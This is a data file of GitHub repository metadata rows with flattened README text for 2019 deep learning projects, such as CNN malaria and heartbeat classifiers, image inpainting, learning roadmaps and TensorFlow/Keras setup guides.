Viole-Grace,Deep_Learning_Models,n/a,DeepLearningModels A beginner s guide to deep learning using TensorFlow and Keras Simple models using neural networks Deep Learning with Keras and TensorFlow deepLearning gif,2019-09-27T16:05:05Z,2019-10-29T18:51:17Z,Jupyter Notebook,Viole-Grace,User,1,1,0,16,master,Viole-Grace,1,0,0,0,0,0,0
asantucci,deep_learning_notes,n/a,Deep Learning Notes This is a personal repository which will be built for learning purposes I plan to document Andrew Ng s Coursera Deep Learning specialization the sole output file of interest will be NN pdf Source code for homework assignments will be stored in a separate private repository so as to preserve the course honor code,2019-10-24T23:43:14Z,2019-12-14T01:21:41Z,TeX,asantucci,User,1,1,0,110,master,asantucci,1,0,0,0,0,0,0
khanhlee,deepPromoter,n/a,DeepPromoter A sequence based approach for classifying DNA promoters by using deep learning and continuous FastText N gram levels Step 1 Install FastText package via the instructions here https github com facebookresearch fastText Step 2 Use fasttextgenerated py file to transform FASTA sequence into FastText format python fasttextgenerated py fastafile fasttextfile Step 3 Print vectors using FastText model fasttext print sentence vectors model bin vectorfile Step 4 Use promotercnn py to train and evaluate model based on generated vectors python promotercnn py vectorfile,2019-10-12T08:38:31Z,2019-11-30T04:21:17Z,Python,khanhlee,User,1,1,0,11,master,khanhlee,1,0,0,0,0,0,0
ElPapi42,DeepBay,n/a,made with python https img shields io badge Made 20with Python 1f425f svg https www python org Development Status https github com ElPapi42 DeepBay workflows build badge svg branch development https github com ElPapi42 DeepBay actions query workflow 3A 22Test Package 22 GitHub version https badge fury io gh Elpapi42 2FDeepBay svg https badge fury io gh Elpapi42 2FDeepBay Last Commit https badgen net github last commit ElPapi42 DeepBay https github com ElPapi42 DeepBay graphs commit activity DeepBay This project was created with the objective of compile Machine Learning Architectures created using Tensorflow or Keras The architectures must be provided as a ready to use Plug and Play module that can be easily integrated into any existing project or architecture design Installation You can use pip for install this from PyPi https pypi org project deepbay pip install deepbay Quick Start You can use any architecture inside deepbay as an self contained model ready to be trained python import tensorflow as tf import deepbay denseblock deepbay DenseBlock units 1 Or you can integrate it to any existing architecture just use it as any other keras layer python import tensorflow as tf import deepbay model tf keras models Sequential model add deepbay DenseBlock units 1,2019-10-24T20:21:45Z,2019-12-08T03:05:16Z,Python,ElPapi42,User,1,1,0,87,master,ElPapi42,1,11,11,1,0,0,7
kekesidavid,DeepPurple,n/a,Image Inpainting for Regular Holes Using Partial Convolutions Abstract Image inpainting is the process of restorating a missing undesired or damaged part of an image Initially the technical faults of early cameras scratches stains were corrected by experts while the development of photos Although nowadays the manipulation of images happens digitally the proper way of inpainting still requires skilled hands Many effort have been made to solve the automatization of this method In this paper we represent our work on applying a model based on partial convolutions to fill missing parts of images with natural looking content Team Logo https github com kekesidavid DeepPurple blob master DeepPurple png Kirly Zoltn G24TCR adatok elksztse mretezs maszkols hlzat elksztse cloud environent bezemelse hlzat tantsa Sndor Mtys YHMJTY datasetek felkutatsa hlzat tovbbtantsa checkpoint bl hiperparamter optimalizci Kkesi Dvid J9PCWO tudomnyterlet feltrkpezse adatok beszerzse desktop environment bezemelse hlzat tovbbtantsa checkpoint bl Requirements Python 3 6 TensorFlow 1 13 Keras 2 2 4 OpenCV and NumPy maszkolshoz ImageIO adatelksztshez Rszletes specifikci a spec file txt fjlban How to use VGG16 letltse s bemsolsa a Data mappba VGG16 download https drive google com file d 1HOzmKQFljTdKWftEP kWD7p2paEaeHM0 view a notebooks networkandtraining ipynb cellinak futtatsa a Train model alcmig STAGE1 initial training sh Initial weights set from vgg16 pretrained model model PConvUnet imgrows 256 imgcols 256 vggweights data pytorchvgg16 h5 Futtassuk a fenti kdot a VGG16 slyainak betltshez Majd a model fitgenerator kezdet cellt a tantshoz 60 70 epoch hosszan STAGE2 fine tuning sh Load trained model model PConvUnet imgrows 256 imgcols 256 model load data log weights weights 95 0 90 h5 trainbn True lr 0 00015 Futtassuk a fenti kdot ModelCheckpoint betltshez a fjlnv helyre rtelemszeren az kerljn amit be szeretnnk tlteni s msoljuk a path ban lv mappba Majd a model fitgenerator kezdet cellt a tantshoz 50 60 epoch hosszan 0 00005 LearningRate mellett Predictions sh Load trained model model PConvUnet imgrows 256 imgcols 256 model load data log weights weights 95 0 90 h5 trainbn True lr 0 00015 Futtassuk a fenti kdot ModelCheckpoint betltshez az elzekhez hasonlan Futtassuk az utols cellt a predikcik generlshoz A generlt kpek a data log testsamples mappba kerlnek Last Checkpoint A teljes training elvgzst kveten a hlzatunk slyai az albbi linken elrhet fjlban tallhatak weights download https drive google com file d 1c4qXxUBBKn4dqwr7T9zLfotWkv5BJWoL view Results R1 https github com kekesidavid DeepPurple blob master docs images r1 png R2 https github com kekesidavid DeepPurple blob master docs images r2 png R3 https github com kekesidavid DeepPurple blob master docs images r3 png R4 https github com kekesidavid DeepPurple blob master docs images r4 png,2019-10-15T09:44:20Z,2019-12-14T19:36:11Z,Jupyter Notebook,kekesidavid,User,1,1,0,26,master,kekesidavid#zekiraly,2,0,0,0,0,0,0
MirkoGiugliano,advanced-machine-learning,n/a,advanced machine learning In questa sezione caricher gli assignement in ambito deep learning and neural network codice in Python report PDF,2019-10-30T13:53:51Z,2019-11-11T11:57:36Z,Jupyter Notebook,MirkoGiugliano,User,1,1,0,9,master,MirkoGiugliano,1,0,0,0,0,0,0
joshy-joy,Image-classification-using-deep-learning,n/a,,2019-09-25T16:04:14Z,2019-09-25T16:29:01Z,Jupyter Notebook,joshy-joy,User,1,1,0,1,master,joshy-joy,1,0,0,0,0,0,0
Bryce1010,deeplearning_notebooks,attention#deep-learning#detection#image-classification#medical#pytorch#shot-learning#tutorials#video-classification,TOC Deep learning papers reading roadmap https github com floodsung Deep Learning Papers Reading Roadmap Data science roadmap https github com MrMimic data scientist roadmap youtube channels for deep learning and computer vision http www codingwoman com youtube channels for deep learning and computer vision Awesome http bbs cvmart net articles 400 awsome github zi yuan hui zong AI CheetSheet https github com Niraj Lunavat Artificial Intelligence DeelLearningTutorial AI https github com Mikoto10032 DeepLearning ref AI from https zhuanlan zhihu com p 64080846 utmsource com evernote utmmedium social utmoi 638013007834255360 Foreword Review Blog https bryce1010 blog csdn net 1 otimes odot odot A odot B AB Hadamard oplus oplus Mathematics tutorial https github com Bryce1010 deeplearningnotebooks blob master 1 20Mathematics 0 20mathtutorial md x Distribution is All You Need url https zhuanlan zhihu com p 83578219 utmsource com yinxiang utmmedium social utmoi 638013007834255360 The Math of Intelligence from Siraj url https www youtube com watch v xRJCOz3AfYY list PL2 dafEMk2A7mu0bSksCGMJEmeddUH4D 2 data mine tutorial https github com Bryce1010 deeplearningnotebooks blob master 2 20DataMine 0 20dataminetutorial md 4 Machine Learning Tutorial https github com Bryce1010 deeplearningnotebooks blob master 4 20MachineLearning 4 0 20machinelearningtutorial md Machine Learning Yearning https redstonewill com 2658 Ensemble Learning Methods http vital dinf usherbrooke ca ensemble learning methods 5 Deep Learning Tutorial https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 0 20deeplearningtutorial md Dive into DL pytorch https github com OUCMachineLearning OUCML blob master BOOK Dive into DL PyTorch pdf 5 1 Basic Network 5 1 1 Attention x 1 What is Attention https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 1 20basic 20network 5 1 1 20Attention 1 20WhatisAttention md 5 1 2 Capsule Nets 5 1 3 Loss Function Class Balanced Loss Cross Entropy Loss Normalization Methods in Deep Learning url https mlexplained com 2018 11 30 an overview of normalization methods in deep learning Loss Function url https www countbayesie com blog 2017 5 9 kullback leibler divergence explained https colah github io posts 2015 09 Visual Information Class Balanced Loss Based on Effective Number of Samples uel https github com vandit15 Class balanced loss pytorch 5 1 4 Classification Networks awesome image classification url https github com weiaicunzai awesome image classification Imbalanced Training Data Data Augmentation url http bbs cvmart net topics 1112 url https medium com jonathanhui debug a deep learning network part 5 1123c20f960d x ICML 2019 EfficientNet Rethinking Model Scaling for Convolutional Neural Networks paper https arxiv org abs 1905 11946 ICCV 2019 Searching for MobileNetV3 paper https arxiv org abs 1905 02244 x CVPR 2018 Squeeze and Excitation Networks SENet paper https arxiv org abs 1709 01507 code https github com moskomule senet pytorch review https bryce1010 blog csdn net article details 103615134 CVPR 2018 Learning Transferable Architectures for Scalable Image Recognition NASNet paper https arxiv org abs 1707 07012 x CVPR 2017 Aggregated Residual Transformations for Deep Neural Networks ResNext paper https arxiv org abs 1611 05431 5 1 5 Optimization Optimization tutorial url https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 1 20basic 20network 5 1 5 20Optimization 0 20optimizationtutorial md 5 1 6 Visualization x Visualization Overview url https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 1 20basic 20network 5 1 6 20Visualization 0 20Visualization 20overview md x grad cam review url https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 1 20basic 20network 5 1 6 20Visualization 1 20gradcam md 5 1 7 Few shot Learning Few shot tutorials url https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 1 20basic 20network 5 1 7 20Few shotLearning 0 20few shotturoial md Awesome few shot url https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 1 20basic 20network 5 1 7 20Few shotLearning 1 20few shot 20in 202019cvpr 20 md 5 1 8 Crowd Counting Crowd Counting tutorials url https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 1 20basic 20network 5 1 8 20CrowdCounting 0 20crowdtutorial md 5 1 9 Domain Adaptation Domain Adaption tutorials url https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 1 20basic 20network 5 1 9 20DomainAdaptation 0 20domainadaptiontutorial md 5 1 10 Knowledge Distillation Knowledge Distillation url https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 1 20basic 20network 5 1 10 20knowledgedistillation 0 20knowledgedistillationtutorial md 5 1 11 Transfer Learning Transfer Learning url https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 1 20basic 20network 5 1 11 20Transfer 20Learning 0 20transfer 20learning 20tutorial md 5 2 Medical Image Analysis 5 2 1 Medical Classification 5 2 2 Medical Segmentation 5 2 4 Medical Detection 5 3 Generative Adversarial Network GAN tutorials https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 3 20GanerativeAdversarialNetwork 5 3 0 20gantutorial md CVPR2019 A Style Based Generator Architecture for Generative Adversarial Networks StyleGAN paper https arxiv org abs 1812 04948 arXiv2019 Analyzing and Improving the Image Quality of StyleGAN paper https arxiv org abs 1912 04958 5 4 OCR OCR tutorials url https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 4 20OCR 5 4 0 20OCRtutorial md 5 4 1 Image Caption 5 4 2 OCR Detection 5 5 Object Detection Object Detection url https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 5 20ObjectDetection 5 5 0 20objectdetectiontutorial md NIPS 2019 DetNAS Backbone Search for Object Detection paper https arxiv org abs 1903 10979 ICCV 2019 CenterNet Keypoint Triplets for Object Detection paper https arxiv org abs 1904 08189 CVPR 2019 NAS FPN Learning Scalable Feature Pyramid Architecture for Object Detection paper https arxiv org abs 1904 07392 ECCV 2018 CornerNet Detecting Objects as Paired Keypoints paper https arxiv org abs 1808 01244 2018 YOLOv3 An Incremental Improvement paper https pjreddie com darknet yolo ICCV 2017 Mask R CNN paper http openaccess thecvf com contenticcv2017 html HeMaskR CNNICCV2017paper html ICCV 2017 Feature Pyramid Networks for Object Detection FPN paper https arxiv org abs 1612 03144 ICCV 2017 Best Student Paper Focal Loss for Dense Object Detection RetinaNet paper https arxiv org abs 1708 02002 ECCV 2016 SSD Single Shot MultiBox Detector paper https arxiv org abs 1512 02325 NIPS 2015 Faster R CNN Towards Real Time Object Detection with Region Proposal Networks paper https arxiv org abs 1506 01497 Detectron url https zhuanlan zhihu com p 96931265 5 6 Video Analysis 5 6 1 Video Classification 1 Review Video Classification https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 6 20VideoAnalysis 5 6 0 20videoclassificationtutorial md x CVPR 2018 Non local Neural Networks paper https arxiv org abs 1711 07971 code https github com AlexHex7 Non localpytorch TSM Temporal Shift Module for Efficient Video Understanding paper https arxiv org pdf 1811 08383 pdf 5 7 Segmentation Segmentation tutorials https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 7 20Segmentation 5 7 0 20segmentationtutorial md x PointRend Image Segmentation as Rendering paper https arxiv org pdf 1912 08193 pdf review https zhuanlan zhihu com p 98351269 5 8 Graphic Neural Network GNN tutorialsL0 is the ultimate sparsity measure but L1 is also a good approximation for sparsity Sparse coding is very good for compression inpainting and denoising https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 8 20GNN 5 8 0 20GNNtutorial md awesome graph classification https github com benedekrozemberczki awesome graph classification Must read papers and continuous track on Graph Neural Network https github com jdlc105 Must read papers and continuous tracking on Graph Neural Network GNN progress 5 9 Auto MachineLearning Auto Machine https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 9 20AutoMachineLearning 5 9 0 20automachinetutorial md Awesome NAS https github com D X Y Awesome NAS Searching for A Robust Neural Architecture in Four GPU Hours https github com D X Y NAS Projects 5 10 Meta Learning Meta Learning tutorials https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 10 20MetaLearning 5 10 0 20metatutorial md 5 11 Pose Estimation Pose Estimation tutorials https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 11 20PoseEstimation 5 11 0 20poseestimationtutorial md 5 12 3D Object 3D Object tutorials https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 10 20MetaLearning 5 10 0 20metatutorial md 5 13 Unsupervised Learning Unsupervised Learning https github com Bryce1010 deeplearningnotebooks blob master 5 20DeepLearning 5 13 20UnsuperviseLearning 5 13 0 20unsupervisetutorial md 6 Reinforcement Learning https github com Bryce1010 deeplearningnotebooks blob master 6 20ReinforcementLearning 6 0 20reinforcementoverview md 7 NLP NLP tutorials https github com Bryce1010 deeplearningnotebooks blob master 7 20NLP 7 0 20NLPOverview md 8 Programmer Languages 8 1 Python 1 python tutorial https github com Bryce1010 deeplearningnotebooks blob master 8 20Skills 8 1 20python 8 1 1 20pythontutorial md 2 python https docs pythontab com interpy 8 2 PyTorch Pytorch 8 3 C Cpp cpp reference http www cplusplus com reference 8 4 OpenCV Python OpenCV Python https github com ex2tron OpenCV Python Tutorial Youtube OpenCV Python Tutorial For Beginners 8 5 TensorFlow TensorFlow Tutorial https github com Bryce1010 deeplearningnotebooks blob master 8 20Skills 8 5 20TensorFlow 8 5 0 20tensorflowtutorial md 8 6 Writing 8 6 1 Latex Latex https github com ElegantLaTeX ElegantNote x Youtube LaTex Tutorial https www youtube com watch v cbjMkRDqioI list PLHpfx416EzLNOfkDpkRhgMbXg76GdBeHW index 2 8 7 Linux 8 7 1 Linux basic Hacker Tools https www youtube com watch v dbDRfmH5uSI list PLyzOVJj3bHQuiujH1lpn8cA9dsyulbYRv index 3 8 8 Fast AI Fast AI 9 9 1 Implements Transformer Reimplement https github com Bryce1010 Transfromer Non local CNN pytorch yolo v3 https github com eriklindernoren PyTorch YOLOv3 9 2 Competitions Machine Learning Contests https mlcontests com Data Science Challenge Competitions https www datascicamp com sub DM CV NLP RL SP KaggleKaggle past Solutions http ndres me kaggle past solutions Kaggle http kagglesolutions com x CSRNet FPN https github com Bryce1010 CrowdCountingEM x APTOS 2019 Winner Solutions Review https github com Bryce1010 APTOS2019WinnerReview Understanding Clouds from Satellite Images http kagglesolutions com Open Images 2019 Object Detection https tianchi aliyun com competition entrance 231763 introduction DeepFake detection https www kaggle com c deepfake detection challenge 13 Free Books Courses Online https github com ruanyf free books CVPR2000 2019 best paper https mp weixin qq com s G1zwxGj8tWTQp6gfNlTDdA Progressive 13 1 Videos Images Theory and Analytics Laboratory VITAL of Sherbrooke University http vital dinf usherbrooke ca weekly reading group weekly machine learning videos blog https vitalab github io LilLog https lilianweng github io lil log Berkeley Artificial Intelligence Research https bair berkeley edu blog Jay Alammar NLP https jalammar github io Createmomo https createmomo github io Jonathan Hui blog https jhui github io daiwks blog https daiwk github io Github https github com kon9chunkit GitHub Chinese Top Charts GitHub AI Learn Notes https github com Jackpopc aiLearnNotes https github com rogerzhu MNWeeklyCategory blob master README md telesens co http www telesens co 13 2 Excellent Courses Deep Bayes 2019 url https www youtube com playlist list PLe5rNUydzV9QHe8VDStpU0o8Yp63OecdW DeepLearning ai C4W1L01 url https www youtube com watch v ArPaAXPhIs list PLkDaE6sCZn6Gl29AoE31iwdVwSG KnDzF url http tanqingbo com 2019 10 22 E6 9C BA E5 99 A8 E5 AD A6 E4 B9 A0 E5 BF 85 E8 AF BB E7 BB 8F E5 85 B8 E4 B9 A6 E7 B1 8D E4 B8 8E E8 AE BA E6 96 87 http tanqingbo com 2019 10 22 2019 CIFAR DLRL Summer School Lectures ZBengio url https www youtube com playlist list PLKlhhkvvU8 aXmPQZNYGe 2nTd0tJE8v app desktop Neral Networks Tricks of the Trade url https download csdn net download u012348436 9976255 url http jd92 wang assets files transferlearningtutorialwjd pdf Machine Learning Deep Learning NLP url https github com NLP LOVE ML NLP PyData NYC python Machine Learning url https www youtube com playlist list PLGVZCDnMOq0pwoOqsaA87cAoNM4MWr51M Hacker Tools url https www youtube com playlist list PLyzOVJj3bHQuiujH1lpn8cA9dsyulbYRv Cousera url https www coursera org The Age of A I AI url https www youtube com playlist list PLjq6DwYksrzzfsWIpPcf6V7p2RNAneKc app desktop Learn TensorFlow in 3 Hours url https www youtube com watch v DFKHh7zzJc app desktop CVSS 2019 Computational Vision Summer School url https www youtube com playlist list PLeCNfJWZKqxsvidOlVLtWq9s7sIsX1QTC app desktop NIPS 2019 Hightlight papers url https www youtube com playlist list PLMOsa1Hki8vaGeUdU997lDLELcfga9k app desktop Advanced AI Deep Reinforcement Learning in Python url https www youtube com playlist list PLkpP4Ufp35T YsZS0lg6Mb4j0GNm1moau app desktop Conference 2019ICCV all papers http openaccess thecvf com ICCV2019 py github https github com extreme assistant iccv2019 2019CVPR all papers http openaccess thecvf com CVPR2019 py github https github com extreme assistant cvpr2019,2019-09-21T14:46:52Z,2019-12-14T12:23:27Z,n/a,Bryce1010,User,1,1,0,185,master,Bryce1010,1,0,0,0,0,0,0
pflashgary,deep-lab,n/a,Jupyter Lab for Deep Learning All required Python Libraries for roof material classification using aerial imagery How to build sh docker build t lab Run sh PORT 8999 docker run rm v HOME notebooks data rw p PORT 8080 e EXTERNALPORT PORT lab,2019-10-21T09:00:00Z,2019-11-11T05:35:55Z,Dockerfile,pflashgary,User,1,1,1,14,master,pflashgary#NickLarsenNZ,2,0,1,0,0,0,2
madkin,Deep-learning-with-basic-algo,n/a,,2019-10-23T10:57:38Z,2019-10-23T17:21:03Z,Python,madkin,User,1,1,0,1,master,madkin,1,0,0,0,0,0,0
shobhitsrivastava-ds,Deep-Learning-Project-Document-Cleaner,n/a,Deep Learning Porject Document Cleaner,2019-10-20T11:08:25Z,2019-11-01T10:17:34Z,Jupyter Notebook,shobhitsrivastava-ds,User,1,1,0,2,master,shobhitsrivastava-ds,1,0,0,0,0,0,0
AselaDK,Deep-Learning-Using-Tensorflow-Colab,n/a,Deep Learning Using Tensorflow Colab The model that I created for Hackstat 2 0 held by University of Colombo Gave me the accuracy of 85,2019-10-13T15:40:35Z,2019-10-14T04:16:31Z,Jupyter Notebook,AselaDK,User,1,1,0,2,master,AselaDK,1,0,0,0,0,0,0
abhishek1291997,Image-classification-using-deep-learning,n/a,Image classification using deep learning Classifying different classes in images with the help of deep knowledge This code pattern demonstrates how images specifically document images like buildings forest sea glacier can be classified using Convolutional Neural Network CNN What is CNN and why CNN A CNN is a supervised learning technique which needs both input data and target output data to be supplied These are classified by using their labels in order to provide a learned model for future data analysis CNN has three main constituents a Convolutional Layer a Pooling Layer and a Fully connected Dense Network The Convolutional layer takes the input image and applies m number of nxn filters to receive a feature map The feature map is next fed into the max pool layer which is essentially used for dimensionality reduction it picks only the best features from the feature map Finally all the features are flattened and sent as input to the fully connected dense neural network which learns the weights using backpropagation and provides the classification output The MOTIVATION behind the CNN is that it takes one section window of the input image at a time for classification Each time the CNN will produce a feature map for each section in the convolutional layer In the Pooling layer it removes the excess features and takes only the most important features for that section thereby performing feature extraction Hence with the use of CNNs we don t have to perform an additional feature extraction technique CNNs require lesser pre processing as compared to other similar classification algorithms Getting Started Use the Anaconda navigator to open the Jupyter notebook and start implementing it Pre requisites Install all these libraries in your local environment Numpy Pandas Scikit learn Keras cv2 pathlib glob os Dataset This is image data of Natural Scenes around the world This Data contains around 25k images of size 150x150 distributed under 6 categories buildings forest glacier mountain sea street There are around 14k images in Train 3k in Test and 7k in Prediction Working Firstly I imported all the useful libraries needed for our project Then we started by creating empty lists for our training data test data folder After all this get all the images from directories to predefined empty lists by reading them and resizing them so that all the images are of same size After this start making the model and training the data The main challenge in making the model to create a efficient one which has low computational cost By using the separable convolution instead of traditional convolution layer we achieved the better result with less computation cost Acknowledgement Used the dataset from kaggle intel image classification https www kaggle com puneet6060 intel image classification Thanks to https datahack analyticsvidhya com for the challenge and Intel for the Data Photo by Jan Bttinger on Unsplash,2019-10-11T19:20:13Z,2019-10-12T20:08:18Z,Jupyter Notebook,abhishek1291997,User,1,1,0,7,master,abhishek1291997,1,0,0,0,0,0,0
DOE-NCI-Pilot1,NIH.AI-Deep-Learning-Tutorial,n/a,NIH AI Deep Learning Tutorial tutorial material for NIH AI workshop,2019-10-23T14:03:03Z,2019-10-23T20:23:25Z,Jupyter Notebook,DOE-NCI-Pilot1,Organization,1,1,2,4,master,aclyde11,1,0,0,0,1,0,1
xuhuahaoren,Environment-Configuration-of-Deep-Learning,n/a,Environment Configuration of Deep Learning Xuhua Dong f03c15 https placehold it 15 f03c15 000000 text Environment Setup 1 with GPUs 0 Check whether you GPU has Compute Capability 3 0 or higher https developer nvidia com cuda gpus If not please refer either Environment Setup 2 with CPUs https github com xuhuahaoren Environment Configuration of Deep Learning environment setup 2 with cpus or Environment Setup 3 with GPU Tesla K80 Google Colab https github com xuhuahaoren Environment Configuration of Deep Learning environment setup 3 with gpu tesla k80 google colab 1 Download and install CUDA Toolkit 9 2 or higher https developer nvidia com cuda downloads 2 Download cuDNN v7 1 or higher https developer nvidia com cudnn the cuDNN must match the CUDA extract downloaded file copy bin include and lib folders to ProgramFiles NVIDIA GPU Computing ToolkitCUDAv9 2 3 You should restart your computer to apply systems changes 4 Download and install Anaconda3 https repo continuum io archive Anaconda3 2019 03 with Python 3 5 https repo continuum io archive Anaconda3 2019 03 Windows x8664 exe 5 Open Command Prompt as Administrator 6 Install TensorFlow GPU by entering conda install c anaconda tensorflow gpu or install the tensorflow gpu in Anaconda Navigator 7 Enter conda install c anaconda keras gpu to install Keras GPU or install the keras gpu in Anaconda Navigotor 1589F0 https placehold it 15 1589F0 000000 text Environment Setup 2 with CPUs 1 Download and install Anaconda3 https repo continuum io archive Anaconda3 2019 03 with Python 3 5 https repo continuum io archive Anaconda3 2019 03 Windows x8664 exe 2 Open Command Prompt as Administrator 3 Install TensorFlow by entering conda install c conda forge tensorflow or install tensorflow in Anaconda Navigator 4 Enter conda install c conda forge keras to install Keras or install keras in Anaconda Navigator c5f015 https placehold it 15 c5f015 000000 text Environment Setup 3 with GPU Tesla K80 Google Colab A free of charge way to experience training deep models with high performance GPU 1 Visit Google Colaboratory https colab research google com notebooks welcome ipynb 2 Sign in with you personal Google account 3 Menu File New Python 3 notebook 4 Menu Runtime Change runtime type Hardware acceleration GPU Save Note that python source codes will be saved in your Google Drive and a work shift lasts for 12 hours 5 Let s get started with this Jupyter Notebook https github com nhduong introdeep blob master examples colabgettingstarted ipynb how to use GPU execute Linux commands install Python packages and read data from Google Drive Usage 1 Use Anaconda Navigator or Windows Command Prompt conda create name python to create new environment for different deep learning frame And install the jupyter in new environment 2 Download ipynb files to your computer For example D dl 3 Open Command Prompt and activate your enviroment using activate Then type cd d D dl 4 Enter jupyter notebook 5 Jupyter IDE will be opened in a web browser open one of the downloaded programs 6 Select menu Cell Run All to run the program 7 other IDE rerecommend Pycharm https www jetbrains com pycharm download section windows Keras Keras Documention https keras io Keras Documention https keras io zh Tensorflow Tensorflow http www tensorfly cn tfdoc tutorials overview html OpenCV 1 OpenCV3 0 or higher Contrib https www lfd uci edu gohlke pythonlibs numpy 2 Open Command Prompt and go to the filepath of OpenCV Package Then pip install,2019-10-08T16:17:22Z,2019-10-10T16:26:51Z,n/a,xuhuahaoren,User,1,1,0,20,master,xuhuahaoren,1,0,0,0,0,0,0
RnabSanyal,Heartbeat-Classification-Using-Deep-Learning,n/a,Heartbeat Classification Using Deep Learning Heartbeat sounds are generated as blood flows through the valves in the heart The closing and opening of various valves mark the stages of a blood circulation cycle Irregularities in the heartbeat if detected at the right time can be a crucial factor in treating cardiac disorders and thus prevent them from aggravating and turning fatal Breaking down the heartbeat The beats in a normal heartbeat consists of two distinct sounds S1 Lub and S2 Dub These sounds are generated as the valves in the heart close to facilitate the movement of blood At the start of each systole the ventricles squeeze to pump out the blood shutting the Mitral and the Tricuspid valves and thus producing the Lub sound Similarly the Dub sound is produced by the closing of the Aortic and Pulmonic valves which marks the end of the systole Murmurs are caused by turbulent blood flow through or near the heart This can produce audible noise and might be an indicator of an underlying heart problem Extra Heart Sounds S3 and S4 are rare and produce a gallop like sound Extrasystole sounds may appear occasionally and can be identified because there is a heart sound that is out of rhythm involving extra or skipped heartbeats It doesn t occur periodically unlike extra heart sounds DataSet used The data set used has been obtained from Kaggle here s the link https www kaggle com kinguistics heartbeat sounds The data consists of audio recordings from two sources Set A from the general public via the iStethoscope Pro iPhone app Set B from a clinic trial in hospitals using the digital stethoscope DigiScope The sources have been combined into a single dataset used to train the model Following are the tags present in the dataset 1 Normal subclass of noisy normal present 2 Murmur subclass of noisy murmur present 3 Extra Heart Sound 4 Artifact noisy recordings with usually no discernable heart sounds 5 Extrasystole The attempt is to classify these heartbeats using a Deep Learning Model with LSTM The concepts code and model evaluation are included in the python notebook,2019-09-25T18:52:07Z,2019-10-06T11:03:42Z,Jupyter Notebook,RnabSanyal,User,1,1,0,11,master,RnabSanyal,1,0,0,0,0,0,0
agungsantoso,deep-reinforcement-learning-nanodegree-projects,n/a,Deep Reinforcement Learning Nanodegree Projects GitHub https img shields io github license mashape apistatus svg A collection of projects on Deep Reinforcement Learning Nanodegree PyTorch Scholarship Challenge Phase 3 2019 Contributions are always welcome Project 1 Navigation https github com agungsantoso deep reinforcement learning nanodegree projects tree master p1 Project 2 Continuous Control https github com agungsantoso deep reinforcement learning nanodegree projects tree master p2 Project 3 Collaboration and Competition https github com agungsantoso deep reinforcement learning nanodegree projects tree master p3,2019-09-25T03:54:22Z,2019-11-08T04:32:12Z,Jupyter Notebook,agungsantoso,User,1,1,0,0,master,,0,0,0,0,0,0,0
gaddisa,Deep-Learning-Assignments-and-Solutions,n/a,Deep Learning Assignments and Solutions,2019-09-23T09:49:12Z,2019-09-23T09:56:22Z,Python,gaddisa,User,1,1,0,3,master,gaddisa,1,0,0,0,0,0,0
siwarnasri,Deep-learning-with-python-.pdf,n/a,Franois Chollet s book DEEP LEARING with Python For me DEEP LEARING with Python was the first book to begin my deep learning journey and in my opinion it was the best So I recommend it for you alt text Chollet DLP HI png jpg,2019-09-25T08:40:40Z,2019-09-25T08:59:20Z,n/a,siwarnasri,User,1,1,0,4,master,siwarnasri,1,0,0,0,0,0,0
abhishek1291997,Detecting-Malaria-with-Deep-Learning,cnn-classification#deep-learning#python,Detecting Malaria with Deep Learning Here is the way to detect malaria by their cell images This code pattern demonstrates how images specifically cell images of Parasitized and Uninfected can be classified using Convolutional Neural Network CNN Let s talk something about malaria Malaria is a life threatening disease caused by parasites that are transmitted to people through the bites of infected female Anopheles mosquitoes It is preventable and curable According to WHO there are 212 Million malaria cases and 435000 deaths Early diagnostics and treatment of malaria can prevent deaths Malaria is prevalent across the world especially in tropical regions the severity of malaria varies based on the species of plasmodium Symptoms are chills fever and sweating usually occurring a few weeks after being bitten Why CNN for malaria detection Convolution layers learn spatial hierarchical patterns from the data which are also translation invariant Thus they are able to learn different aspects of images For example the first convolution layer will learn small and local patterns such as edges and corners a second convolution layer will learn larger patterns based on the features from the first layers and so on This allows CNNs to automate feature engineering and learn effective features which generalize well on new data points Pooling layers help with downsampling and dimension reduction Thus CNNs help us with automated and scalable feature engineering Also plugging in dense layers at the end of our model enables us to perform tasks like image classification Automated malaria detection using deep learning models like CNNs could be very effective cheap and scalable especially with the advent of transfer learning and pre trained models which work quite well even with constraints like less data Getting Started Use the Anaconda navigator to open the Jupyter notebook and start implementing it Pre requisites Install all these libraries in your local environment Numpy Pandas Scikit learn Keras cv2 pathlib glob os Dataset The dataset contains 2 folders Infected Uninfected And a total of 27 558 images Working Firstly I imported all the useful libraries needed for our project Then we started by creating empty lists for our training data test data folder After all this get all the images from directories to predefined empty lists by reading them and resizing them so that all the images are of same size After this start making the model and training the data The main challenge faced while making this project is less amount of data because this is the technology which is useful in near future to detect the malaria by AI so we need to be accurate as much as possible For this we used Data Augmentation to used the current data we have to generate more data which is much more feasible Acknowledgements This Dataset is taken from the official NIH Website https ceb nlm nih gov repositories malaria datasets And uploaded here so anybody trying to start working with this dataset can get started immediately as to download the dataset from NIH website is quite slow Photo by on Unsplash https unsplash com ekamelev Inspiration Save humans by detecting and deploying Image Cells that contain Malaria or not,2019-10-11T18:36:00Z,2019-10-12T20:13:47Z,Jupyter Notebook,abhishek1291997,User,1,1,0,6,master,abhishek1291997,1,0,0,0,0,0,0
